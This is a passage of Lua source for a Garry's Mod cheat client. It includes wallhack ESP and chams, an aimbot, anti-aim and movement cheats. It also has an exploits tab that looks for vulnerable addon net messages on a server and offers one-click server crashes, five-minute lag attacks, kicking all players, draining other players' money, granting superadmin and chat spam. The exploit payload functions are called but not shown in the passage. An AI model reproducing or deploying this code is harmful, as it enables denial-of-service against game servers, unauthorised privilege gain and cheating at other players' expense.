            pMenu.DrawSlider(Frame,390,55,260,20,"ESP BoxColor.r",0,  255,  255)
            draw.SimpleText("G","Font M",660,80,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,390,80,260,20,"ESP BoxColor.g",0,  255,  0)
            draw.SimpleText("B","Font M",660,105,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,390,105,260,20,"ESP BoxColor.b",0,  255,  255)

            draw.SimpleText("Text Color","Font M",390,130,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            draw.SimpleText("R","Font M",660,150,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,390,150,260,20,"ESP TextColor.r",0,  255,  255)
            draw.SimpleText("G","Font M",660,175,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,390,175,260,20,"ESP TextColor.g",0,  255,  206)
            draw.SimpleText("B","Font M",660,200,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,390,200,260,20,"ESP TextColor.b",0,  255,  121)

            draw.SimpleText("Chams Visible","Font M",390,225,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            draw.SimpleText("R","Font M",660,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,390,250,260,20,"ESP ChamVisColor.r",0,  255,  10)
            draw.SimpleText("G","Font M",660,275,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,390,275,260,20,"ESP ChamVisColor.g",0,  255,  206)
            draw.SimpleText("B","Font M",660,300,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,390,300,260,20,"ESP ChamVisColor.b",0,  255,  4)

            draw.SimpleText("Chams Non-Visible","Font M",390,325,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            draw.SimpleText("R","Font M",660,350,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,390,350,260,20,"ESP ChamNVisColor.r",0,  255,  70)
            draw.SimpleText("G","Font M",660,375,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,390,375,260,20,"ESP ChamNVisColor.g",0,  255,  70)
            draw.SimpleText("B","Font M",660,400,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,390,400,260,20,"ESP ChamNVisColor.b",0,  255,  255)

            pMenu.Drawline(375,30,375,490,Color(0,255,255,255))
        end
        if pMenuVars.Tabs[misc].value then
            pMenu.DrawCheckBox(Frame,170,55,"MISC Thirdperson",false,"Enable ThirdPerson")
            draw.SimpleText("Distance","Font M",170,85,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,170,105,260,20,"MISC Thirdperson Distance",10,  300,  100)
            pMenu.DrawCheckBox(Frame,170,135,"MISC Bhop",true,"Enable Bunnyhop")
            pMenu.DrawCheckBox(Frame,170,165,"MISC Autostrafe",true,"Enable Autostrafe")
            pMenu.DrawCheckBox(Frame,170,195,"MISC Text to speech is fucking aids",false,"Enable Text to Speech")
        end
        if pMenuVars.Tabs[b1gExploits].value then
            if pMenu.IsNetString("duelrequestguiYes")then
                pMenu.DrawExploit(Frame,140,30,170,50,"Duel Moniez",BigExploits["Duel Moniez"].func,"Dueling","Give b1g money")
            end
            if pMenu.IsNetString("drugseffect_remove") then
                pMenu.DrawExploit(Frame,140,85,170,50,"Drugsmod remove all weapons?",BigExploits["Drugsmod remove all weapons?"].func,"Drugsmod","Strip all Weapons?")
            end
            if pMenu.IsNetString("drugs_money") then
                pMenu.DrawExploit(Frame,140,140,170,50,"Drugsmod remove all money?",BigExploits["Drugsmod remove all money?"].func,"Drugsmod","Remove all money?")
            end
            if pMenu.IsNetString("drugs_ignite") then
                pMenu.DrawExploit(Frame,140,195,170,50,"Drugsmod ignite all props?",BigExploits["Drugsmod ignite all props?"].func,"Drugsmod","ignite all props?")
            end
            if pMenu.IsNetString("drugs_text") then
                pMenu.DrawExploit(Frame,140,250,170,50,"Drugsmod remove all props?",BigExploits["Drugsmod remove all props?"].func,"Drugsmod","Remove all props?")
            end
            if pMenu.IsNetString("SyncPrinterButtons76561198056171650") then
                pMenu.DrawExploit(Frame,140,305,170,50,"TGN Advanced Money Printer Take Monie",BigExploits["TGN Advanced Money Printer Take Monie"].func,"TGN Advanced Printer","Take all money")
            end
            if pMenu.IsNetString("DL_Answering") then
                pMenu.DrawExploit(Frame,140,360,170,50,"Logging thing Kick All players?",BigExploits["Logging thing Kick All players?"].func,"Logging thing","Kick all players")
            end
            if pMenu.IsNetString("SimplicityAC_aysent") then
                pMenu.DrawExploit(Frame,140,415,170,50,"SimplicityAC Crash Server",BigExploits["SimplicityAC Crash Server"].func,"SimplicityAC","Crash Server")
            end
            if pMenu.IsNetString("ATS_WARP_REMOVE_CLIENT") then
                pMenu.DrawExploit(Frame,315,30,170,50,"Auzlex's Teleport System Lag",BigExploits["Auzlex's Teleport System Lag"].func,"Auzlex's Teleport System","Lag Server for 5 min")
            end
            if pMenu.IsNetString("CFRemoveGame") then
                pMenu.DrawExploit(Frame,315,85,170,50,"Lagger 2",BigExploits["Lagger 2"].func,"Lagger 2 (5 min)")
            end
            if pMenu.IsNetString("CreateCase") then
                pMenu.DrawExploit(Frame,315,140,170,50,"Lagger 3",BigExploits["Lagger 3"].func,"Lagger 3 (5 min)")
            end
            if pMenu.IsNetString("rprotect_terminal_settings") then
                pMenu.DrawExploit(Frame,315,195,170,50,"Lagger 4",BigExploits["Lagger 4"].func,"Lagger 4 (5 min)")
            end
            if pMenu.IsNetString("StackGhost") then
                pMenu.DrawExploit(Frame,315,250,170,50,"Lagger 5",BigExploits["Lagger 5"].func,"Lagger 5 (5 min)")
            end
            if pMenu.IsNetString("JoinOrg") then
                pMenu.DrawExploit(Frame,315,250,170,50,"Lagger 6",BigExploits["Lagger 6"].func,"Lagger 6 (5 min)")
            end
            if pMenu.IsNetString("pac_submit") then
                pMenu.DrawExploit(Frame,315,305,170,50,"Lagger 7",BigExploits["Lagger 7"].func,"Lagger 7 (5 min)")
            end
            if pMenu.IsNetString("pac_to_contraption") then
                pMenu.DrawExploit(Frame,315,360,170,50,"PAC Crash Server old",BigExploits["PAC Crash Server old"].func,"PAC (patched on some)","Crash Server")
            end
            if pMenu.IsNetString("NLRKick") then
                pMenu.DrawExploit(Frame,315,415,170,50,"NLRKick",BigExploits["NLRKick"].func,"NLR","Kick everyone (but you)")
            end
            if pMenu.IsNetString("steamid2") then
                pMenu.DrawExploit(Frame,490,30,170,50,"Lagger 8",BigExploits["Lagger 8"].func,"Lagger 8 (5min)")
            end
            if pMenu.IsNetString("NDES_SelectedEmblem") then
                pMenu.DrawExploit(Frame,490,85,170,50,"Lagger 9",BigExploits["Lagger 9"].func,"Lagger 9 (5min)")
            end
            if pMenu.IsNetString("join_disconnect") then
                pMenu.DrawExploit(Frame,490,140,170,50,"Lagger 10",BigExploits["Lagger 10"].func,"Lagger 10 (5min)")
            end
            if pMenu.IsNetString("Morpheus.StaffTracker") then
                pMenu.DrawExploit(Frame,490,195,170,50,"B1g Crasher",BigExploits["B1g Crasher"].func,"B1g Crasher")
            end
            if pMenu.IsNetString("pplay_deleterow") then
                pMenu.DrawExploit(Frame,490,250,170,50,"Give superadmin",BigExploits["Give superadmin"].func,"Give superadmin")
            end
            pMenu.DrawExploit(Frame,490,305,170,50,"pm spam",BigExploits["pm spam"].func,"Spam")
            pMenu.DrawExploit(Frame,490,360,170,50,"asay spam",BigExploits["asay spam"].func,"asay spam")
            draw.SimpleText("Defqon pExploitcity ","Font L",140,470,Color(255,255,255,255),TEXT_ALIGN_LEFT)
        end
        if pMenuVars.Tabs[Aimbot].value then
            pMenu.DrawCheckBox(Frame,170,55,"Aibmot Enable",false,"Enable")
            draw.SimpleText("Aimbot FOV","Font M",170,85,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,170,105,490,20,"Aimbot FOV",1,  360,  10,true)

            pMenu.DrawCheckBox(Frame,170,140,"Aibmot Smooth",false,"Smooth movement")
            draw.SimpleText("Smooth amount","Font M",170,170,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,170,190,225,20,"Aimbot Smooth AMT",1,  100,  5)

            pMenu.DrawCheckBox(Frame,410,140,"Aibmot Show fov circle",false,"Aibmot FOV circle (sort of accurate)")
            draw.SimpleText("Circle color","Font M",410,170,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            draw.SimpleText("R","Font M",645,190,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,410,190,225,20,"Aimbot Circle.r",1,  255,  255)
            draw.SimpleText("G","Font M",645,215,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,410,215,225,20,"Aimbot Circle.g",1,  255,  255)
            draw.SimpleText("B","Font M",645,240,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,410,240,225,20,"Aimbot Circle.b",1,  255,  1)
            draw.SimpleText("A","Font M",645,265,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,410,265,225,20,"Aimbot Circle.a",1,  255,  255)--159

            draw.SimpleText("Aimkey (wiki.garrysmod.com/page/Enums/KEY) Default: Left Alt","Font M",170,290,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,170,315,490,20,"Aimbot Key",1,  159,  81)

            draw.SimpleText("Aimspot (default values): 1 = head, 2 = neck,3 = top of the spine","Font M",170,340,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            draw.SimpleText("4 = center spine,5 = stomach.   More can be added at the top of the code","Font M",170,360,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,170,385,490,20,"Aimbot Bone",1,  #AimbotPoints,  1)
        end
        if pMenuVars.Tabs[hvh].value then
            pMenu.DrawCheckBox(Frame,170,55,"HvH Enable",false,"Enable")
            pMenu.DrawCheckBox(Frame,170,100,"HvH Antiaim",false,"Enable AntiAim")
            draw.SimpleText("Pitch Angle","Font M",170,125,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,170,150,490,20,"HvH Pitch",-360,  360,  -180.05332,true)
            draw.SimpleText("Yaw Angle","Font M",170,175,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,170,200,490,20,"HvH Yaw",-360,  360,  -80,true)
            draw.SimpleText("Style: 1 jitter spin, 2 spin, 3 random,4 at player,5 static,6 yaw + cam.y","Font M",170,225,Color(255,255,255,255),TEXT_ALIGN_LEFT)
            pMenu.DrawSlider(Frame,170,250,200,20,"HvH Style",1,  6,  4)
            if pMenuVars.Sliders["HvH Style"].value == 2 then
                draw.SimpleText("Spin Speed (ang  + (IntervalPerTick + Number)","Font M",380,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
                pMenu.DrawSlider(Frame,380,275,285,20,"HvH Spin Speed",1,  1000,  235)
            elseif pMenuVars.Sliders["HvH Style"].value == 3 then
                draw.SimpleText("Random min/max","Font M",380,250,Color(255,255,255,255),TEXT_ALIGN_LEFT)
                pMenu.DrawSlider(Frame,380,275,200,20,"HvH randomY",1,  180,  45)
            end

            pMenu.DrawCheckBox(Frame,170,310,"HvH Autoshoot",false,"Autoshoot")
            pMenu.DrawCheckBox(Frame,170,460,"HvH pList",false,"pList")
        end
        if firsttime then
            pMenuVars.Tabs[Visuals].value = false;
            pMenuVars.Tabs[misc].value = false;
            pMenuVars.Tabs[b1gExploits].value = false;
            pMenuVars.Tabs[Aimbot].value = false;
            pMenuVars.Tabs[hvh].value = true;
        end
        firsttime = false;
    end
    local PList = vgui.Create( "DFrame" )
    PList:SetTitle( "" )
    PList:SetSize( 300, ScrH() )
    PList:SetPos(0,0)
    PList:ShowCloseButton(false)
    PList:MakePopup()
    PList.Paint = function( self, w, h )
        if pMenuVars.CheckBoxes["HvH pList"] != nil && pMenuVars.CheckBoxes["HvH pList"].value then
            if pMenuVars.Tabs["HvH"].value != nil && pMenuVars.Tabs["HvH"].value then
                pMenu.DrawRect(0, 0, w, h, Color( 32,45,54, 230 ))
                draw.SimpleText("PList","Font L",w/2,1,Color(255,255,255,255),TEXT_ALIGN_CENTER)
                draw.SimpleText("dont shooting?","Font M",w/2,21,Color(255,255,255,255),TEXT_ALIGN_CENTER)
                draw.SimpleText("User It! :)","Font M",w/2,42,Color(255,255,255,255),TEXT_ALIGN_CENTER)
                local up = 20;
                local add = 50
                local k = 0;
                for _,v in pairs(player.GetAll()) do
                    k = k + 1;
                    if v == LocalPlayer() then
                        k = k -1
                        continue;
                    end
                    pMenu.DrawOutLinedRect(10,up + (k * add),280,44,Color(255,255,255,255))
                    pMenu.DrawRect(10,up + (k * add),280,44,Color(18,89,131,170))
                    draw.SimpleText(v:Nick(),"Font M",12,up + (k * add) + 3,Color(0,255,255,255))

                    draw.SimpleText("P:","Font M",175,up + (k * add) + 3,Color(0,255,255,255))
                    pMenu.DrawSlider(PList,190,up + (k * add),100,22,v:SteamID().."Force Pitch",-180,  180,  0,true)
                    draw.SimpleText("Y:","Font M",175,up + (k * add) + 24,Color(0,255,255,255))
                    pMenu.DrawSlider(PList,190,up + (k * add)+22,100,22,v:SteamID().."Force Yaw",-180,  180,  0,true)

                    pMenu.DrawCheckBox(PList,11,up + (k * add) + 23,v:SteamID().."Baim",false,"baim")
                    pMenu.DrawCheckBox(PList,75,up + (k * add) + 23,v:SteamID().."Force Ang",false,"Force Ang")
                end
            end
        end
        if Frame == NULL then
            self:Close()
        end
    end
end

function pMenu.boundingbox(ply)
    local iBoxWidth = 26;
    local iBoxHeight = 71;

		if ply:LookupBone("ValveBiped.Bip01_Spine")==-1 then
			return end
    local pos = ply:GetBonePosition(ply:LookupBone("ValveBiped.Bip01_Spine"));
    if (ply:Crouching()) then
        pos = Vector(pos.x, pos.y, pos.z - 27);
        iBoxHeight = 55;
    else
        pos = Vector(pos.x,pos.y,pos.z - 42.5);
    end

    local points = {
        Vector(pos.x - iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z ),
        Vector(pos.x - iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z ),
        Vector(pos.x + iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z ),
        Vector(pos.x + iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z ),
        Vector(pos.x + iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z + iBoxHeight),
        Vector(pos.x - iBoxWidth / 2, pos.y + iBoxWidth / 2, pos.z + iBoxHeight),
        Vector(pos.x - iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z + iBoxHeight),
        Vector(pos.x + iBoxWidth / 2, pos.y - iBoxWidth / 2, pos.z + iBoxHeight),
    };
    local flb = points[4]:ToScreen();
    local brt = points[6]:ToScreen();
    local blb = points[1]:ToScreen();
    local frt = points[5]:ToScreen();
    local frb = points[3]:ToScreen();
    local brb = points[2]:ToScreen();
    local blt = points[7]:ToScreen();
    local flt = points[8]:ToScreen();
    local arr = { flb, brt, blb, frt, frb, brb, blt, flt };

    local t1 = flb.x;
    local t2 = flb.y;
    local t3 = flb.x;
    local t4 = flb.y;

    for i=1,8 do
        if (t1 > arr[i].x) then
            t1 = arr[i].x;
        end
        if (t4 < arr[i].y) then
            t4 = arr[i].y;
        end
        if (t3 < arr[i].x) then
            t3 = arr[i].x;
        end
        if (t2 > arr[i].y) then
            t2 = arr[i].y;
        end
    end
    return t1,t3,t2,t4;
end
function pMenu.PredictPos(pos)
    local myvel = LocalPlayer():GetVelocity()
    local pos = pos - (myvel * engine.TickInterval());
    return pos;
end
function pMenu.SmoothAngle(angle,me,SmoothPercent)
    local first = Vector(angle.x - me.x, math.NormalizeAngle(angle.y - me.y), 0.0);
    local smoothX = me.x + first.x / 100 * SmoothPercent;
    local smoothY = me.y + first.y / 100 * SmoothPercent;
    return Angle(smoothX, math.NormalizeAngle(smoothY), 0.0);
end
function pMenu.GetAngle(src, dst)
    local delta = pMenu.PredictPos(Vector(dst.x - src.x, dst.y - src.y, dst.z - src.z));
    local hyp = math.sqrt(delta.x * delta.x + delta.y * delta.y);
    local pitch = math.atan(delta.z/hyp) * Rad * -1;
    local yaw = math.atan(delta.y / delta.x) * Rad;
    if (delta.x >= 0) then
        yaw = yaw + 180;
    end
    return Angle(pitch, math.NormalizeAngle(yaw - 180), 0.0);
end
function pMenu.GetAngleVector(src, dst)
    local delta = pMenu.PredictPos(Vector(dst.x - src.x, dst.y - src.y, dst.z - src.z));
    local hyp = math.sqrt(delta.x * delta.x + delta.y * delta.y);
    local pitch = math.atan(delta.z/hyp) * Rad * -1;
    local yaw = math.atan(delta.y / delta.x) * Rad;
    if (delta.x >= 0) then
        yaw = yaw + 180;
    end
    return Vector(pitch, math.NormalizeAngle(yaw - 180), 0.0);
end
function pMenu.ClosestEntToCross(limit,pcmd,bonee,Angle)
    if limit == nil then
        limit = 360;
    end
    local curAng = Vector(Angle.x,Angle.y + 180,0);
    local curEye = LocalPlayer():EyePos()
    local ret = NULL
    local retDist = 1000;
    for k,v in pairs(player.GetAll()) do
        if v == LocalPlayer() || !v:Alive() then
            continue;
        end
        local pos = Vector(0,0,0);
        if bonee != nil then
            pos = pMenu.PredictPos(v:GetBonePosition(v:LookupBone(bonee)))
        else
            pos = pMenu.PredictPos(v:GetBonePosition(v:LookupBone(AimbotPoints[pMenuVars.Sliders["Aimbot Bone"].value].bone)))
        end
        local tarAng = pMenu.GetAngleVector(curEye,pos);
        tarAng = Vector(tarAng.x,tarAng.y + 180,0);
        local dist = tarAng:Distance(curAng);
        if dist <= limit && dist < retDist && LocalPlayer():IsLineOfSightClear(pos) then
            ret = v;
            retDist = dist;
        end
    end
    return ret;
end
function pMenu.AAA(ply)
    local Angles = ply:EyeAngles()
    if pMenuVars.CheckBoxes[ply:SteamID().."Force Ang"] != nil && pMenuVars.CheckBoxes[ply:SteamID().."Force Ang"].value then
        Angles.p = math.NormalizeAngle( math.Clamp(Angles.p,-89,89) + pMenuVars.Sliders[ply:SteamID().."Force Pitch"].value)
        Angles.y = math.NormalizeAngle( math.NormalizeAngle(Angles.y) + pMenuVars.Sliders[ply:SteamID().."Force Yaw"].value)
    end
    ply:SetPoseParameter("aim_pitch", Angles.p);
    ply:SetPoseParameter("body_yaw", Angles.y);
    ply:SetPoseParameter("aim_yaw", 0);
    ply:InvalidateBoneCache();
    ply:SetRenderAngles(Angle(0, Angles.y, 0));
end
hook.Add("RenderScene","tes",function()
    for k,v in pairs(player.GetAll()) do
        if v == LocalPlayer() then
            continue;
        end
        pMenu.AAA(v)
    end
end)
function pMenu.DrawESP(ply)
    local boxcolor = Color(pMenuVars.Sliders["ESP BoxColor.r"].value,pMenuVars.Sliders["ESP BoxColor.g"].value,pMenuVars.Sliders["ESP BoxColor.b"].value,255)
    local textcolor = Color(pMenuVars.Sliders["ESP TextColor.r"].value,pMenuVars.Sliders["ESP TextColor.g"].value,pMenuVars.Sliders["ESP TextColor.b"].value,255)
    local left,right,top,bottom = pMenu.boundingbox(ply)
    if pMenuVars.CheckBoxes["ESP BoundingBox"].value then
        surface.SetDrawColor(boxcolor);
        surface.DrawOutlinedRect(left + 1,top + 1, (right - left) + 1,(bottom - top) + 1)
    end
    if pMenuVars.CheckBoxes["ESP HealthBar"].value then
        surface.SetDrawColor(0,0,0,255);
        surface.DrawRect(left - 5,top - 1 + 2,4, (bottom - top) / 100 * ply:Health() + 2)
        surface.SetDrawColor(255,0,0,255);
        surface.DrawRect(left - 4,top + 2,2, (bottom - top) / 100 * ply:Health())
    end

    if (pMenuVars.CheckBoxes["ESP Name"].value) then
        draw.SimpleText(ply:Nick(),"Font L2",left + (right - left) / 2,top - 5,textcolor,TEXT_ALIGN_CENTER,TEXT_ALIGN_BOTTOM)
    end
    if (pMenuVars.CheckBoxes["ESP Position"].value) then
        local pos = ply:GetPos();
        draw.SimpleText("POS = ".."X: "..math.floor(pos.x).." Y: "..math.floor(pos.y).." Z: "..math.floor(pos.z),"Font L2",right + 3,top,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
    end
    if (pMenuVars.CheckBoxes["ESP Angles"].value) then
        local pos = ply:EyeAngles();
        draw.SimpleText("ANG.X: "..(ply:EyeAngles().p),"Font L2",right + 3,top + 12,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
        draw.SimpleText("ANG.Y: "..(ply:EyeAngles().y),"Font L2",right + 3,top + 24,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
        draw.SimpleText("ANG.Z: "..(ply:EyeAngles().r),"Font L2",right + 3,top + 36,textcolor,TEXT_ALIGN_LEFT,TEXT_ALIGN_TOP)
    end
    if (pMenuVars.CheckBoxes["ESP Traceline"].value) then
        local eyes = (ply:EyePos() + ply:EyeAngles():Forward() * pMenuVars.Sliders["ESP Traceline Distance"].value):ToScreen();
        local eye = ply:EyePos():ToScreen();

        surface.SetDrawColor(255,255,255,255)
        if eye.visible && eyes.visible then
            surface.DrawLine(eyes.x,eyes.y,eye.x,eye.y)
        end
    end
end
// pasted chams because l a z y
local chamsmat = CreateMaterial("a", "VertexLitGeneric", {
    ["$ignorez"] = 1,
    ["$model"] = 1,
    ["$basetexture"] = "models/debug/debugwhite",
})
local chamsmat2 = CreateMaterial("@", "VertexLitGeneric", {
    ["$ignorez"] = 0,
    ["$model"] = 1,
    ["$basetexture"] = "models/debug/debugwhite",
})
function pMenu.Chams(v)
    local ChamVis = Color(pMenuVars.Sliders["ESP ChamVisColor.r"].value,pMenuVars.Sliders["ESP ChamVisColor.g"].value,pMenuVars.Sliders["ESP ChamVisColor.b"].value,255)
    local ChamNVis = Color(pMenuVars.Sliders["ESP ChamNVisColor.r"].value,pMenuVars.Sliders["ESP ChamNVisColor.g"].value,pMenuVars.Sliders["ESP ChamNVisColor.b"].value,255)
    cam.Start3D()
        if v:IsValid() then
            if pMenuVars.CheckBoxes["ESP XQZ"].value then
                render.MaterialOverride(chamsmat)
                render.SetColorModulation(ChamNVis.r/ 255, ChamNVis.g/255, ChamNVis.b/255)
                v:DrawModel()
            end

            render.SetColorModulation(ChamVis.r / 255, ChamVis.g/ 255, ChamVis.b/ 255)--vis
            render.MaterialOverride(chamsmat2)
            v:DrawModel()
        end
        local wep = v:GetActiveWeapon()
        local wep = v:GetActiveWeapon()
        if wep:IsValid() then
            if pMenuVars.CheckBoxes["ESP WeaponCham"].value then
                render.MaterialOverride(chamsmat)
                render.SetColorModulation(255/255, 0/255, 0/255, 255)
                wep:DrawModel()
                render.SetColorModulation(255/255, 255/255, 0/255, 255)
                render.MaterialOverride(chamsmat2)
                wep:DrawModel()
            end
        end
    cam.End3D()
end
function pMenu.bhop(pcmd)
    if (!LocalPlayer():IsOnGround() && !LocalPlayer():IsTyping() && pcmd:KeyDown(IN_JUMP)) then
        pcmd:RemoveKey(IN_JUMP)
    end
end
function pMenu.autostrafe(pcmd)
    if !(LocalPlayer():IsOnGround()) && input.IsKeyDown(KEY_SPACE) then
        if(pcmd:GetMouseX() > 1 or pcmd:GetMouseX() < -1) then
            if(pcmd:GetMouseX() < 0) then
                pcmd:SetSideMove(-400)
            else
                pcmd:SetSideMove(400)
            end
        else
            pcmd:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D())
            pcmd:SetSideMove((pcmd:CommandNumber() % 2 == 0) and 400 or -400)
        end
    end
end
function pMenu.ToggleMenu()
    if Frame == NULL then
        pMenu.Menu()
    else
        Frame:Close()
        Frame = NULL
    end
end
function pMenu.FixMovement(pCmd,fa,angles)
    local vec = Vector(pCmd:GetForwardMove(pCmd), pCmd:GetSideMove(), 0)
    local vel = math.sqrt(vec.x*vec.x + vec.y*vec.y)
    local mang = vec:Angle()
    local yaw = angles.y - fa.y + mang.y
    if (((angles.p+90)%360) > 180) then
        yaw = 180 - yaw
    end
    yaw = ((yaw + 180)%360)-180
    pCmd:SetForwardMove(math.cos(math.rad(yaw)) * vel)
    pCmd:SetSideMove(math.sin(math.rad(yaw)) * vel)
end
function pMenu.Shoot(pcmd)
    if(LocalPlayer():KeyDown(1)) then
        pcmd:SetButtons(bit.band( pcmd:GetButtons(), bit.bnot( 1 ) ) );
    else
        pcmd:SetButtons(bit.bor( pcmd:GetButtons(), 1 ) );
    end
end
hook.Add("RenderScreenspaceEffects","hkRenderScreenspaceEffects",function()
    if (pMenuVars.CheckBoxes["ESP Chams"] != nil && pMenuVars.CheckBoxes["ESP Chams"].value && pMenuVars.CheckBoxes["ESP"] != nil && pMenuVars.CheckBoxes["ESP"].value) then
        for k,v in pairs(player.GetAll()) do
            if v != LocalPlayer() && v:Alive() && !v:IsDormant() && v:Health() > 1 then
                pMenu.Chams(v);
            end
        end
    end
end)

hook.Add("PreDrawHalos","hkPreDrawHalos",function()
    if (pMenuVars.CheckBoxes["ESP Glow"] != nil && pMenuVars.CheckBoxes["ESP Glow"].value && pMenuVars.CheckBoxes["ESP"] != nil && pMenuVars.CheckBoxes["ESP"].value) then
        local tab = {}
        for k,v in pairs(player.GetAll()) do
            if v != LocalPlayer() &&  v:Alive() then
                tab[k] = v;
            end
        end
        halo.Add( tab, Color( 255, 255, 255 ), 2, 2, 4,true,true )
    end
end)
hook.Add("HUDPaint","hkHUDPaint",function()
	if pMenuVars.CheckBoxes["ESP"] != nil && pMenuVars.CheckBoxes["ESP"].value then
    for k,v in pairs(player.GetAll()) do
        if v != LocalPlayer() then
					if v:Alive() then
              pMenu.DrawESP(v)
					end
        end
    end
	end
    if pMenuVars.CheckBoxes["Aibmot Show fov circle"] != nil && pMenuVars.CheckBoxes["Aibmot Show fov circle"].value then
        local End = (ScrW() / (LocalPlayer():GetFOV() + 60) ) * pMenuVars.Sliders["Aimbot FOV"].value;
        pMenu.DrawCircle(ScrW() / 2,ScrH() / 2, End, 70,Color(pMenuVars.Sliders["Aimbot Circle.r"].value,pMenuVars.Sliders["Aimbot Circle.g"].value,pMenuVars.Sliders["Aimbot Circle.b"].value,pMenuVars.Sliders["Aimbot Circle.a"].value))
    end
end)
local View = Angle();
hook.Add("CalcView","hkCalcView",function(ply, pos1, angles, fov)
    if (pMenuVars.CheckBoxes["HvH Enable"] != nil && pMenuVars.CheckBoxes["HvH Enable"].value) then
        local view = {}
        local ang = View
        view.angles = View
        local angfwd = ang:Forward();
        local distance = pMenuVars.Sliders["MISC Thirdperson Distance"].value
        local endpoz = Vector(pos1.x - distance * angfwd.x,pos1.y - distance * angfwd.y, pos1.z - distance * angfwd.z);
        local tracelines = util.TraceLine({start = LocalPlayer():EyePos(),endpos  = endpoz, filter = LocalPlayer()})

        view.origin = tracelines.HitPos
        view.drawviewer = true;
        return view;
    end
    if pMenuVars.CheckBoxes["MISC Thirdperson"] != nil && pMenuVars.CheckBoxes["MISC Thirdperson"].value then
        local view = {}
        local ang = angles
        view.angles = ang
        local angfwd = ang:Forward();
        local distance = pMenuVars.Sliders["MISC Thirdperson Distance"].value
        local endpoz = Vector(pos1.x - distance * angfwd.x,pos1.y - distance * angfwd.y, pos1.z - distance * angfwd.z);
        local tracelines = util.TraceLine({start = LocalPlayer():EyePos(),endpos  = endpoz, filter = LocalPlayer()})

        view.origin = tracelines.HitPos
        view.drawviewer = true;
        return view;
    end
end)
local t = 0;
local jitter = false;
local AShoot = false;
hook.Add("CreateMove","hkCreateMove",function(pCmd)
    if pMenuVars.CheckBoxes["MISC Bhop"] != nil && pMenuVars.CheckBoxes["MISC Bhop"].value then
        pMenu.bhop(pCmd)
    end
    if pMenuVars.CheckBoxes["MISC Autostrafe"] != nil && pMenuVars.CheckBoxes["MISC Autostrafe"].value then
        pMenu.autostrafe(pCmd)
    end
    if pMenuVars.CheckBoxes["Aibmot Enable"] != nil && pMenuVars.CheckBoxes["Aibmot Enable"].value then
        if input.IsKeyDown(pMenuVars.Sliders["Aimbot Key"].value) then
            local nearest = pMenu.ClosestEntToCross(pMenuVars.Sliders["Aimbot FOV"].value,pCmd,AimbotPoints[pMenuVars.Sliders["Aimbot Bone"].value].bone,pCmd:GetViewAngles());
            if nearest != NULL then
                local Eye = LocalPlayer():EyePos();
                local target = nearest:GetBonePosition(nearest:LookupBone(AimbotPoints[pMenuVars.Sliders["Aimbot Bone"].value].bone))
                local End = Angle();
                if pMenuVars.CheckBoxes["Aibmot Smooth"].value then
                    End = pMenu.SmoothAngle(pMenu.GetAngle(Eye,target),pCmd:GetViewAngles(),pMenuVars.Sliders["Aimbot Smooth AMT"].value);
                else
                    End = pMenu.GetAngle(Eye,target)
                end
                pCmd:SetViewAngles(End)
            end
        end
    end
    if input.IsKeyDown(KEY_DELETE) then
        t = t + 1
        if t == 1 then
            pMenu.ToggleMenu()
        end
    else
        t = 0;
    end
    local fwdmouse = Vector(pCmd:GetMouseX(),pCmd:GetMouseY(),0)
    View.y = math.NormalizeAngle(View.y + ( ((fwdmouse.x / 250) * GetConVar("sensitivity"):GetInt() )* -1) );
    View.x = math.Clamp(View.x + ( ((fwdmouse.y / 250) * GetConVar("sensitivity"):GetInt() )),-89,89 );
    View:Normalize()
    if (pMenuVars.CheckBoxes["HvH Enable"] != nil && pMenuVars.CheckBoxes["HvH Enable"].value) then
        local CurAngles = pCmd:GetViewAngles()
        local Anglez = Angle(View.x,View.y,0);
        if (pMenuVars.CheckBoxes["HvH Antiaim"].value) then
            Anglez = Angle(pMenuVars.Sliders["HvH Pitch"].value,pMenuVars.Sliders["HvH Yaw"].value,0);
